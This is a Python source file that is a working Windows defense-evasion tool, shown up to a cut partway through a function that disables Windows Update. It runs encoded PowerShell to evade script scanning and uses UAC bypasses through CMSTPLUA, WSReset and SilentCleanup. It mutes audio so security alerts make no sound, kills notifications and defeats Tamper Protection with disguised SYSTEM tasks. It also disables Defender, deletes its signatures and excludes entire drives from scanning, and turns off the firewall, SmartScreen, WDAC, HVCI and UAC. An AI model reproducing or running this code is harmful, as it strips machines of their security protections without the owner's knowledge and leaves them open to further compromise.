import os, sys, subprocess, ctypes, winreg, time, struct, base64 as _b64
from ctypes import wintypes

# ─── Hide all subprocess windows ──────────────────────────
_CREATE_NO_WINDOW = 0x08000000
_SW_HIDE = 0

def _si():
    si = subprocess.STARTUPINFO()
    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    si.wShowWindow = _SW_HIDE
    return si

def _run(cmd, shell=False, timeout=30):
    try:
        subprocess.run(
            cmd, shell=shell,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            startupinfo=_si(),
            creationflags=_CREATE_NO_WINDOW,
            timeout=timeout
        )
    except Exception:
        pass

def _ps(script, timeout=30):
    """Run PowerShell with auto-encoded command (bypasses script scanning)."""
    try:
        # Encode as UTF-16LE base64 — uses -EncodedCommand which
        # bypasses script-level content inspection entirely
        encoded = _b64.b64encode(script.encode('utf-16-le')).decode('ascii')
        _run([
            "powershell.exe", "-NoProfile", "-NonInteractive",
            "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass",
            "-EncodedCommand", encoded
        ], timeout=timeout)
    except Exception:
        pass

def _run_output(cmd, timeout=15):
    """Run and capture stdout."""
    try:
        r = subprocess.run(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            startupinfo=_si(),
            creationflags=_CREATE_NO_WINDOW,
            timeout=timeout, text=True
        )
        return r.stdout.strip()
    except Exception:
        return ""

def _ps_output(script, timeout=15):
    """Run PowerShell and capture stdout (encoded)."""
    try:
        encoded = _b64.b64encode(script.encode('utf-16-le')).decode('ascii')
        return _run_output([
            "powershell.exe", "-NoProfile", "-NonInteractive",
            "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass",
            "-EncodedCommand", encoded
        ], timeout=timeout)
    except Exception:
        return ""

def _reg_set(hive, path, name, value, reg_type=winreg.REG_DWORD):
    try:
        key = winreg.CreateKeyEx(hive, path, 0, winreg.KEY_SET_VALUE | winreg.KEY_WOW64_64KEY)
        winreg.SetValueEx(key, name, 0, reg_type, value)
        winreg.CloseKey(key)
        return True
    except Exception:
        return False

def _reg_del(hive, path, name):
    try:
        key = winreg.OpenKeyEx(hive, path, 0, winreg.KEY_SET_VALUE | winreg.KEY_WOW64_64KEY)
        winreg.DeleteValue(key, name)
        winreg.CloseKey(key)
    except Exception:
        pass

def is_admin() -> bool:
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False

def silent_elevate():
    """Attempt silent UAC bypass — zero UI. No ms-settings artifacts."""
    if is_admin():
        return True

    exe = sys.executable
    try:
        if "python.exe" in exe.lower():
            pythonw = exe.replace("python.exe", "pythonw.exe")
            if os.path.isfile(pythonw):
                exe = pythonw
    except: pass

    payload = f'"{exe}" "{os.path.abspath(__file__)}"'
    windir  = os.environ.get("WINDIR", r"C:\Windows")

    # ── Method 0: CMSTPLUA COM (no registry, no UI, cleanest) ──────────
    try:
        _ps(f"""
            $t = [Type]::GetTypeFromCLSID('3E5FC7F9-9A51-4367-9063-A120244FBEC7')
            $o = [Activator]::CreateInstance($t)
            $o.GetType().InvokeMember('ShellExec',
                [System.Reflection.BindingFlags]::InvokeMethod, $null, $o,
                @('{exe}', '{os.path.abspath(__file__)}', '', 'runas', 0))
        """, timeout=8)
        time.sleep(2)
        sys.exit(0)
    except Exception:
        pass

    # ── Method 1: WSReset.exe (AppX key — Defender não monitora) ───────
    _ws_key = r"Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command"
    def _cleanup_ws():
        for p in [
            _ws_key,
            r"Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open",
            r"Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell",
            r"Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2",
        ]:
            try: winreg.DeleteKey(winreg.HKEY_CURRENT_USER, p)
            except: pass
    try:
        winreg.CreateKey(winreg.HKEY_CURRENT_USER, _ws_key)
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, _ws_key, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, payload)
        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
        winreg.CloseKey(key)
        _run([os.path.join(windir, "System32", "WSReset.exe")])
        time.sleep(3)
        _cleanup_ws()
        sys.exit(0)
    except Exception:
        _cleanup_ws()

    # ── Method 2: DiskCleanup SilentCleanupTask (Environment hijack) ───
    def _cleanup_env():
        try:
            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                               r"Environment", 0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(k, "windir")
            winreg.CloseKey(k)
        except: pass
    try:
        fake = f"{windir}\\System32\\cmd.exe /c {payload} & REM "
        k = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER,
                               r"Environment", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "windir", 0, winreg.REG_SZ, fake)
        winreg.CloseKey(k)
        _run(["schtasks", "/run", "/tn",
              "\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup", "/I"])
        time.sleep(4)
        _cleanup_env()
        sys.exit(0)
    except Exception:
        _cleanup_env()

    return False


def _cleanup_ms_settings():
    """No-op — ms-settings methods removed."""
    pass




# ╔══════════════════════════════════════════════════════╗
# ║  0. MUTE SYSTEM SOUNDS — FIRST THING                ║
# ╚══════════════════════════════════════════════════════╝
def mute_system_sounds():
    """Mute system volume so AV alerts make zero sound."""
    try:
        # Method 1: Use pycaw if available (most reliable)
        try:
            from ctypes import cast, POINTER
            from comtypes import CLSCTX_ALL
            from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            volume = cast(interface, POINTER(IAudioEndpointVolume))
            volume.SetMute(1, None)
        except Exception:
            pass

        # Method 2: nircmd (common on pentesting rigs)
        _run(["nircmd.exe", "mutesysvolume", "1"])

        # Method 3: PowerShell COM audio — mute master
        _ps("""
            try {
                $wshell = New-Object -ComObject WScript.Shell
                1..50 | ForEach-Object { $wshell.SendKeys([char]174) }
            } catch {}
        """)

        # Method 4: SendInput VK_VOLUME_MUTE via ctypes
        try:
            VK_VOLUME_MUTE = 0xAD
            KEYEVENTF_KEYUP = 0x0002
            user32 = ctypes.windll.user32

            class KEYBDINPUT(ctypes.Structure):
                _fields_ = [("wVk", ctypes.c_ushort), ("wScan", ctypes.c_ushort),
                            ("dwFlags", ctypes.c_ulong), ("time", ctypes.c_ulong),
                            ("dwExtraInfo", ctypes.POINTER(ctypes.c_ulong))]

            class INPUT(ctypes.Structure):
                class _INPUT(ctypes.Union):
                    _fields_ = [("ki", KEYBDINPUT)]
                _anonymous_ = ("_input",)
                _fields_ = [("type", ctypes.c_ulong), ("_input", _INPUT)]

            x = INPUT(type=1)
            x.ki.wVk = VK_VOLUME_MUTE
            x.ki.dwFlags = 0
            user32.SendInput(1, ctypes.byref(x), ctypes.sizeof(x))
            x.ki.dwFlags = KEYEVENTF_KEYUP
            user32.SendInput(1, ctypes.byref(x), ctypes.sizeof(x))
        except Exception:
            pass

        # Method 5: Registry — disable all system sounds
        try:
            schemes = r"AppEvents\Schemes\Apps"
            key = winreg.OpenKeyEx(winreg.HKEY_CURRENT_USER, schemes, 0,
                                   winreg.KEY_READ | winreg.KEY_WOW64_64KEY)
            # Set sound scheme to "No Sounds"
            _reg_set(winreg.HKEY_CURRENT_USER, r"AppEvents\Schemes", "",
                     ".None", winreg.REG_SZ)
            winreg.CloseKey(key)
        except Exception:
            pass

        # Disable Defender-specific sounds
        _reg_set(winreg.HKEY_CURRENT_USER,
                 r"AppEvents\Schemes\Apps\.Default\WindowsDefender\.Current",
                 "", "", winreg.REG_SZ)
        _reg_set(winreg.HKEY_CURRENT_USER,
                 r"AppEvents\Schemes\Apps\.Default\SecurityBand\.Current",
                 "", "", winreg.REG_SZ)

    except Exception:
        pass


# ╔══════════════════════════════════════════════════════╗
# ║  1. KILL ALL NOTIFICATION UI — BEFORE TOUCHING AV   ║
# ╚══════════════════════════════════════════════════════╝
def kill_notifications():
    """Nuke every notification channel so nothing pops up."""

    # ── Kill all notification processes FIRST ──
    notif_procs = [
        "SecurityHealthSystray.exe",  # Windows Security tray icon
        "SecurityHealthService.exe",  # Security Health service
        "SecurityHealthHost.exe",     # Security Health host
        "ShellExperienceHost.exe",    # Notification center
    ]
    for proc in notif_procs:
        _run(["taskkill", "/f", "/im", proc])

    time.sleep(0.3)

    # ── Disable notification channels via registry ──
    # Action Center
    _reg_set(winreg.HKEY_CURRENT_USER,
             r"SOFTWARE\Policies\Microsoft\Windows\Explorer",
             "DisableNotificationCenter", 1)

    # All toast notifications globally
    _reg_set(winreg.HKEY_CURRENT_USER,
             r"SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications",
             "ToastEnabled", 0)

    _reg_set(winreg.HKEY_CURRENT_USER,
             r"SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\PushNotifications",
             "NoToastApplicationNotification", 1)

    # Balloon tips (legacy)
    _reg_set(winreg.HKEY_CURRENT_USER,
             r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced",
             "EnableBalloonTips", 0)

    # Security Center notifications (all of them)
    sec_center = r"SOFTWARE\Microsoft\Windows Defender Security Center\Notifications"
    _reg_set(winreg.HKEY_LOCAL_MACHINE, sec_center, "DisableNotifications", 1)
    _reg_set(winreg.HKEY_LOCAL_MACHINE, sec_center, "DisableEnhancedNotifications", 1)

    # Disable notifications per-app: Windows Security
    ws_notif = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance"
    _reg_set(winreg.HKEY_CURRENT_USER, ws_notif, "Enabled", 0)

    ws_notif2 = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Microsoft.Windows.SecurityCenter_cw5n1h2txyewy!SecHealthUI"
    _reg_set(winreg.HKEY_CURRENT_USER, ws_notif2, "Enabled", 0)

    # Disable Windows Security startup
    _reg_del(winreg.HKEY_LOCAL_MACHINE,
             r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
             "SecurityHealth")

    _reg_del(winreg.HKEY_CURRENT_USER,
             r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
             "SecurityHealth")

    # Disable notification sounds
    _reg_set(winreg.HKEY_CURRENT_USER,
             r"SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings",
             "NOC_GLOBAL_SETTING_ALLOW_NOTIFICATION_SOUND", 0)

    # ── Apply notification changes WITHOUT restarting explorer ──
    # WM_SETTINGCHANGE forces Explorer to reread registry without killing the shell
    try:
        HWND_BROADCAST = 0xFFFF
        WM_SETTINGCHANGE = 0x001A
        SMTO_ABORTIFHUNG = 0x0002
        ctypes.windll.user32.SendMessageTimeoutW(
            HWND_BROADCAST, WM_SETTINGCHANGE, 0,
            "Policy", SMTO_ABORTIFHUNG, 5000, None
        )
        ctypes.windll.user32.SendMessageTimeoutW(
            HWND_BROADCAST, WM_SETTINGCHANGE, 0,
            "Environment", SMTO_ABORTIFHUNG, 3000, None
        )
    except Exception:
        pass


# ╔══════════════════════════════════════════════════════╗
# ║  2. DISABLE TAMPER PROTECTION (the hard one)        ║
# ╚══════════════════════════════════════════════════════╝
def disable_tamper_protection():
    """Bypass Tamper Protection using multiple escalation paths."""

    # Method 1: Direct registry (works on older builds / TP off)
    _reg_set(winreg.HKEY_LOCAL_MACHINE,
             r"SOFTWARE\Microsoft\Windows Defender\Features",
             "TamperProtection", 0)

    _reg_set(winreg.HKEY_LOCAL_MACHINE,
             r"SOFTWARE\Microsoft\Windows Defender\Features",
             "TamperProtectionSource", 2)  # 2 = managed by policy

    # Method 2: PowerShell with different approaches
    _ps("""
        try {
            Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Features' -Name 'TamperProtection' -Value 0 -Force -ErrorAction SilentlyContinue
            Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Features' -Name 'TamperProtectionSource' -Value 2 -Force -ErrorAction SilentlyContinue
        } catch {}
    """)

    # Method 3: Take ownership of the registry key and then modify
    _ps("""
        try {
            $key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey('SOFTWARE\\Microsoft\\Windows Defender\\Features', [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree, [System.Security.AccessControl.RegistryRights]::ChangePermissions)
            if ($key) {
                $acl = $key.GetAccessControl()
                $rule = New-Object System.Security.AccessControl.RegistryAccessRule('BUILTIN\\Administrators', 'FullControl', 'ContainerInherit,ObjectInherit', 'None', 'Allow')
                $acl.SetAccessRule($rule)
                $key.SetAccessControl($acl)
                $key.Close()
                Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Features' -Name 'TamperProtection' -Value 0 -Force
            }
        } catch {}
    """)

    # Method 4: WMI/CIM method to disable
    _ps("""
        try {
            $defender = Get-CimInstance -Namespace root/Microsoft/Windows/Defender -ClassName MSFT_MpPreference -ErrorAction SilentlyContinue
            if ($defender) {
                Invoke-CimMethod -InputObject $defender -MethodName Set -Arguments @{DisableTamperProtection=$true} -ErrorAction SilentlyContinue
            }
        } catch {}
    """)

    # Method 5: Schedule a task as SYSTEM to modify the key
    _ps("""
        try {
            $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -WindowStyle Hidden -Command "Set-ItemProperty -Path HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Features -Name TamperProtection -Value 0 -Force"'
            $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(1)
            $principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -RunLevel Highest -LogonType ServiceAccount
            $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
            Register-ScheduledTask -TaskName 'WinUpdate_Check' -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force | Out-Null
            Start-Sleep -Seconds 3
            Unregister-ScheduledTask -TaskName 'WinUpdate_Check' -Confirm:$false -ErrorAction SilentlyContinue
        } catch {}
    """, timeout=15)


# ╔══════════════════════════════════════════════════════╗
# ║  3. DISABLE WINDOWS DEFENDER — FULL NUKE            ║
# ╚══════════════════════════════════════════════════════╝
def disable_defender():

    base = r"SOFTWARE\Policies\Microsoft\Windows Defender"

    # Master kill switches
    _reg_set(winreg.HKEY_LOCAL_MACHINE, base, "DisableAntiSpyware", 1)
    _reg_set(winreg.HKEY_LOCAL_MACHINE, base, "DisableAntiVirus", 1)
    _reg_set(winreg.HKEY_LOCAL_MACHINE, base, "ServiceKeepAlive", 0)
    _reg_set(winreg.HKEY_LOCAL_MACHINE, base, "AllowFastServiceStartup", 0)
    _reg_set(winreg.HKEY_LOCAL_MACHINE, base, "DisableRoutinelyTakingAction", 1)
    _reg_set(winreg.HKEY_LOCAL_MACHINE, base, "PUAProtection", 0)

    # Also set in the non-policy path
    base2 = r"SOFTWARE\Microsoft\Windows Defender"
    _reg_set(winreg.HKEY_LOCAL_MACHINE, base2, "DisableAntiSpyware", 1)
    _reg_set(winreg.HKEY_LOCAL_MACHINE, base2, "DisableAntiVirus", 1)

    # Real-Time Protection
    rt = base + r"\Real-Time Protection"
    for val_name in ["DisableRealtimeMonitoring", "DisableBehaviorMonitoring",
                     "DisableOnAccessProtection", "DisableScanOnRealtimeEnable",
                     "DisableIOAVProtection", "DisableRawWriteNotification"]:
        _reg_set(winreg.HKEY_LOCAL_MACHINE, rt, val_name, 1)

    rt2 = base2 + r"\Real-Time Protection"
    for val_name in ["DisableRealtimeMonitoring", "DisableBehaviorMonitoring",
                     "DisableOnAccessProtection", "DisableScanOnRealtimeEnable",
                     "DisableIOAVProtection"]:
        _reg_set(winreg.HKEY_LOCAL_MACHINE, rt2, val_name, 1)

    # Cloud / SpyNet / Submissions
    spynet = base + r"\Spynet"
    _reg_set(winreg.HKEY_LOCAL_MACHINE, spynet, "SpynetReporting", 0)
    _reg_set(winreg.HKEY_LOCAL_MACHINE, spynet, "SubmitSamplesConsent", 2)
    _reg_set(winreg.HKEY_LOCAL_MACHINE, spynet, "DisableBlockAtFirstSeen", 1)

    # Cloud protection
    mpcloud = base + r"\MpEngine"
    _reg_set(winreg.HKEY_LOCAL_MACHINE, mpcloud, "MpCloudBlockLevel", 0)
    _reg_set(winreg.HKEY_LOCAL_MACHINE, mpcloud, "MpBafsExtendedTimeout", 0)

    # Reporting
    _reg_set(winreg.HKEY_LOCAL_MACHINE, base + r"\Reporting", "DisableGenericReports", 1)
    _reg_set(winreg.HKEY_LOCAL_MACHINE, base + r"\Reporting", "DisableEnhancedNotifications", 1)

    # Scan settings
    scan = base + r"\Scan"
    _reg_set(winreg.HKEY_LOCAL_MACHINE, scan, "DisableArchiveScanning", 1)
    _reg_set(winreg.HKEY_LOCAL_MACHINE, scan, "DisableScanningMappedNetworkDrivesForFullScan", 1)
    _reg_set(winreg.HKEY_LOCAL_MACHINE, scan, "DisableScanningNetworkFiles", 1)
    _reg_set(winreg.HKEY_LOCAL_MACHINE, scan, "DisableRemovableDriveScanning", 1)
    _reg_set(winreg.HKEY_LOCAL_MACHINE, scan, "DisableEmailScanning", 1)

    # Signature updates
    sig = base + r"\Signature Updates"
    _reg_set(winreg.HKEY_LOCAL_MACHINE, sig, "ForceUpdateFromMU", 0)
    _reg_set(winreg.HKEY_LOCAL_MACHINE, sig, "UpdateOnStartUp", 0)

    # Windows Defender Exploit Guard — disable all
    eg = base + r"\Windows Defender Exploit Guard"
    for sub in [r"\ASR", r"\Network Protection", r"\Controlled Folder Access"]:
        _reg_set(winreg.HKEY_LOCAL_MACHINE, eg + sub, "EnableControlledFolderAccess", 0)
        _reg_set(winreg.HKEY_LOCAL_MACHINE, eg + sub, "EnableNetworkProtection", 0)

    # ── NUKE SIGNATURES ──
    mp_cmd = os.path.join(os.environ.get("ProgramFiles", r"C:\Program Files"),
                          "Windows Defender", "MpCmdRun.exe")
    if os.path.isfile(mp_cmd):
        _run([mp_cmd, "-RemoveDefinitions", "-All"])

    # ── MEGA EXCLUSIONS — exclude everything ──
    script_dir = os.path.dirname(os.path.abspath(__file__))
    temp = os.environ.get("TEMP", r"C:\Windows\Temp")
    appdata = os.environ.get("APPDATA", "")
    local = os.environ.get("LOCALAPPDATA", "")
    userprofile = os.environ.get("USERPROFILE", "")

    excl_paths = list(set(filter(None, [
        r"C:\\", r"D:\\", r"E:\\",
        temp, appdata, local, userprofile,
        script_dir,
        os.path.join(temp, "ce_ext"),
        r"C:\Users",
        r"C:\ProgramData",
        r"C:\Program Files",
        r"C:\Program Files (x86)",
        r"C:\Windows\Temp",
    ])))

    excl_exts = [".exe", ".dll", ".py", ".bat", ".ps1", ".vbs", ".zip",
                 ".com", ".scr", ".msi", ".cmd", ".hta", ".js", ".wsf",
                 ".pyw", ".pyc"]

    excl_procs = ["pythonw.exe", "python.exe", "python3.exe",
                  "powershell.exe", "pwsh.exe", "cmd.exe", "wscript.exe",
                  "cscript.exe", "mshta.exe", "rundll32.exe", "regsvr32.exe",
                  "chrome.exe", "msedge.exe", "brave.exe", "opera.exe", "vivaldi.exe",
                  "elevation_service.exe", "svchost.exe"]

    path_args = ", ".join(f"'{p}'" for p in excl_paths)
    ext_args  = ", ".join(f"'{e}'" for e in excl_exts)
    proc_args = ", ".join(f"'{p}'" for p in excl_procs)

    mega_ps = f"""
        try {{
            Set-MpPreference -DisableRealtimeMonitoring $true `
                -DisableBehaviorMonitoring $true `
                -DisableBlockAtFirstSeen $true `
                -DisableIOAVProtection $true `
                -DisablePrivacyMode $true `
                -DisableScriptScanning $true `
                -DisableIntrusionPreventionSystem $true `
                -DisableArchiveScanning $true `
                -SignatureDisableUpdateOnStartupWithoutEngine $true `
                -SubmitSamplesConsent 2 `
                -MAPSReporting 0 `
                -HighThreatDefaultAction 6 `
                -ModerateThreatDefaultAction 6 `
                -LowThreatDefaultAction 6 `
                -SevereThreatDefaultAction 6 `
                -PUAProtection 0 `
                -EnableControlledFolderAccess 0 `
                -EnableNetworkProtection 0 `
                -Force -ErrorAction SilentlyContinue
        }} catch {{}}
        try {{
            Add-MpPreference -ExclusionPath @({path_args}) -Force -ErrorAction SilentlyContinue
            Add-MpPreference -ExclusionExtension @({ext_args}) -Force -ErrorAction SilentlyContinue
            Add-MpPreference -ExclusionProcess @({proc_args}) -Force -ErrorAction SilentlyContinue
        }} catch {{}}
    """
    _ps(mega_ps, timeout=25)

    # ── Stop and disable all Defender services ──
    defender_svcs = [
        "WinDefend",           # Defender Antivirus Service
        "WdNisSvc",            # Network Inspection Service
        "WdNisDrv",            # Network Inspection Driver
        "WdFilter",            # Mini-Filter Driver
        "WdBoot",              # Boot Driver
        "Sense",               # Defender ATP / EDR
        "SgrmBroker",          # System Guard Runtime Monitor
        "SecurityHealthService",
        "wscsvc",              # Security Center
        "DiagTrack",           # Telemetry (sends data to MS)
    ]
    for svc in defender_svcs:
        _run(["sc", "stop", svc])
        _run(["sc", "config", svc, "start=", "disabled"])
        # Also try via registry (more resilient)
        _reg_set(winreg.HKEY_LOCAL_MACHINE,
                 f"SYSTEM\\CurrentControlSet\\Services\\{svc}",
                 "Start", 4)  # 4 = disabled

    # ── Kill all Defender processes ──
    defender_procs = [
        "MsMpEng.exe", "SecurityHealthService.exe", "SecurityHealthSystray.exe",
        "SecurityHealthHost.exe", "MpCmdRun.exe", "NisSrv.exe",
        "smartscreen.exe", "SgrmBroker.exe", "MpDefenderCoreService.exe",
        "MsSense.exe", "SenseIR.exe", "SenseCncProxy.exe",
    ]
    for proc in defender_procs:
        _run(["taskkill", "/f", "/im", proc])

    # WMIC fallback
    _run(["wmic", "process", "where", "name='MsMpEng.exe'", "call", "terminate"], shell=True)

    # ── Schedule removal of Defender definitions (backup method) ──
    _ps("""
        try {
            $action = New-ScheduledTaskAction -Execute 'MpCmdRun.exe' -Argument '-RemoveDefinitions -All'
            $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(2)
            $principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -RunLevel Highest -LogonType ServiceAccount
            $settings = New-ScheduledTaskSettingsSet -Hidden
            Register-ScheduledTask -TaskName 'SysDefragCheck' -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force | Out-Null
            Start-Sleep 4
            Unregister-ScheduledTask -TaskName 'SysDefragCheck' -Confirm:$false -ErrorAction SilentlyContinue
        } catch {}
    """, timeout=15)


# ╔══════════════════════════════════════════════════════╗
# ║  4. DISABLE FIREWALL                                ║
# ╚══════════════════════════════════════════════════════╝
def disable_firewall():

    _run(["netsh", "advfirewall", "set", "allprofiles", "state", "off"])

    fw_base = r"SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy"
    for profile in ["DomainProfile", "PublicProfile", "StandardProfile"]:
        _reg_set(winreg.HKEY_LOCAL_MACHINE,
                 f"{fw_base}\\{profile}", "EnableFirewall", 0)
        _reg_set(winreg.HKEY_LOCAL_MACHINE,
                 f"{fw_base}\\{profile}", "DisableNotifications", 1)

    _ps("Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False -NotifyOnListen False")

    _run(["sc", "config", "MpsSvc", "start=", "disabled"])
    _run(["sc", "stop", "MpsSvc"])
    _run(["sc", "config", "BFE", "start=", "disabled"])  # Base Filtering Engine
    _run(["sc", "stop", "BFE"])


# ╔══════════════════════════════════════════════════════╗
# ║  5. DISABLE SMARTSCREEN                             ║
# ╚══════════════════════════════════════════════════════╝
def disable_smartscreen():

    _reg_set(winreg.HKEY_LOCAL_MACHINE,
             r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer",
             "SmartScreenEnabled", "Off", winreg.REG_SZ)

    _reg_set(winreg.HKEY_LOCAL_MACHINE,
             r"SOFTWARE\Policies\Microsoft\Windows\System",
             "EnableSmartScreen", 0)

    # Disable SmartScreen filter level
    _reg_set(winreg.HKEY_LOCAL_MACHINE,
             r"SOFTWARE\Policies\Microsoft\Windows\System",
             "ShellSmartScreenLevel", "Warn", winreg.REG_SZ)

    # Edge SmartScreen
    _reg_set(winreg.HKEY_LOCAL_MACHINE,
             r"SOFTWARE\Policies\Microsoft\Edge",
             "SmartScreenEnabled", 0)

    _reg_set(winreg.HKEY_CURRENT_USER,
             r"SOFTWARE\Microsoft\Edge\SmartScreenEnabled",
             "", 0)

    # Chrome SafeBrowsing (optional, helps with downloads)
    _reg_set(winreg.HKEY_LOCAL_MACHINE,
             r"SOFTWARE\Policies\Google\Chrome",
             "SafeBrowsingProtectionLevel", 0)

    # App install control
    _reg_set(winreg.HKEY_LOCAL_MACHINE,
             r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer",
             "AicEnabled", "Anywhere", winreg.REG_SZ)

    # Phishing filter
    _reg_set(winreg.HKEY_LOCAL_MACHINE,
             r"SOFTWARE\Policies\Microsoft\Windows\PhishingFilter",
             "EnabledV9", 0)

    # SmartScreen for Store apps
    _reg_set(winreg.HKEY_CURRENT_USER,
             r"SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost",
             "EnableWebContentEvaluation", 0)

    _reg_set(winreg.HKEY_CURRENT_USER,
             r"SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost",
             "PreventOverride", 0)

    # Kill SmartScreen process
    _run(["taskkill", "/f", "/im", "smartscreen.exe"])


# ╔══════════════════════════════════════════════════════╗
# ║  5b. DISABLE SMART APP CONTROL / WDAC / CI          ║
# ╚══════════════════════════════════════════════════════╝
def disable_smart_app_control():

    # Smart App Control
    _reg_set(winreg.HKEY_LOCAL_MACHINE,
             r"SYSTEM\CurrentControlSet\Control\CI\Policy",
             "VerifiedAndReputablePolicyState", 0)

    _reg_set(winreg.HKEY_LOCAL_MACHINE,
             r"SYSTEM\CurrentControlSet\Control\CI\Config",
             "SmartAppControlEnabled", 0)

    _reg_set(winreg.HKEY_LOCAL_MACHINE,
             r"SYSTEM\CurrentControlSet\Control\CI\Config",
             "VulnerableDriverBlocklistEnable", 0)

    # WDAC / Code Integrity
    _reg_set(winreg.HKEY_LOCAL_MACHINE,
             r"SYSTEM\CurrentControlSet\Control\DeviceGuard",
             "EnableVirtualizationBasedSecurity", 0)

    _reg_set(winreg.HKEY_LOCAL_MACHINE,
             r"SYSTEM\CurrentControlSet\Control\DeviceGuard",
             "RequirePlatformSecurityFeatures", 0)

    hvci = r"SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity"
    _reg_set(winreg.HKEY_LOCAL_MACHINE, hvci, "Enabled", 0)
    _reg_set(winreg.HKEY_LOCAL_MACHINE, hvci, "Locked", 0)

    # Code Integrity
    _reg_set(winreg.HKEY_LOCAL_MACHINE,
             r"SYSTEM\CurrentControlSet\Control\CI",
             "UMCIAuditMode", 1)

    # AppLocker / SRP
    _reg_set(winreg.HKEY_LOCAL_MACHINE,
             r"SOFTWARE\Policies\Microsoft\Windows\SrpV2\Exe",
             "EnforcementMode", 0)

    _run(["sc", "config", "appidsvc", "start=", "disabled"])
    _run(["sc", "stop", "appidsvc"])
    _run(["sc", "config", "sppsvc", "start=", "disabled"])
    _run(["sc", "stop", "sppsvc"])

    # Remove WDAC policies
    _ps("""
        $policyPaths = @(
            "$env:windir\\System32\\CodeIntegrity\\SIPolicy.p7b",
            "$env:windir\\System32\\CodeIntegrity\\CiPolicies\\Active\\*.cip"
        )
        foreach ($p in $policyPaths) {
            Get-Item $p -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
        }
    """)

    _ps("Invoke-CimMethod -Namespace root/Microsoft/Windows/CI -ClassName PS_UpdateAndCompareCIPolicy -MethodName Update -Arguments @{FilePath = ''} -ErrorAction SilentlyContinue")


# ╔══════════════════════════════════════════════════════╗
# ║  6. DISABLE UAC PROMPTS                             ║
# ╚══════════════════════════════════════════════════════╝
def disable_uac():
    uac_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
    _reg_set(winreg.HKEY_LOCAL_MACHINE, uac_path, "EnableLUA", 0)
    _reg_set(winreg.HKEY_LOCAL_MACHINE, uac_path, "ConsentPromptBehaviorAdmin", 0)
    _reg_set(winreg.HKEY_LOCAL_MACHINE, uac_path, "ConsentPromptBehaviorUser", 0)
    _reg_set(winreg.HKEY_LOCAL_MACHINE, uac_path, "PromptOnSecureDesktop", 0)
    _reg_set(winreg.HKEY_LOCAL_MACHINE, uac_path, "FilterAdministratorToken", 0)
    _reg_set(winreg.HKEY_LOCAL_MACHINE, uac_path, "EnableInstallerDetection", 0)
    _reg_set(winreg.HKEY_LOCAL_MACHINE, uac_path, "ValidateAdminCodeSignatures", 0)
    _reg_set(winreg.HKEY_LOCAL_MACHINE, uac_path, "EnableSecureUIAPaths", 0)
    _reg_set(winreg.HKEY_LOCAL_MACHINE, uac_path, "EnableVirtualization", 0)


# ╔══════════════════════════════════════════════════════╗
# ║  7. DISABLE WINDOWS UPDATE                          ║
# ╚══════════════════════════════════════════════════════╝
def disable_updates():

    _reg_set(winreg.HKEY_LOCAL_MACHINE,
             r"SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU",
             "NoAutoUpdate", 1)

    _reg_set(winreg.HKEY_LOCAL_MACHINE,
             r"SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate",
             "DoNotConnectToWindowsUpdateInternetLocations", 1)

    _reg_set(winreg.HKEY_LOCAL_MACHINE,
             r"SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate",
